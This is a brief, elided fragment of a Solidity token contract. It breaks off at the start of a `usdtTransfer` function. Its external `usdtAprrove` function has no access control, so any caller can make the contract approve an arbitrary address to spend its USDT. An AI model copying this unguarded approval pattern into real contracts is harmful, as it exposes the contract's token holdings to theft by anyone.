...
contract token is IERC20 {   
        ...
        function _transfer(address from, address to ,uint256 val) internal  returns(bool){
           ...
           function  usdtAprrove(address recipient,uint256 amount) external returns(bool){
                   usdt.approve(recipient,amount);
                   return true;
           } 

           function usdtTransfer(address from ,address to ,uint256 amount) external returns(bool){
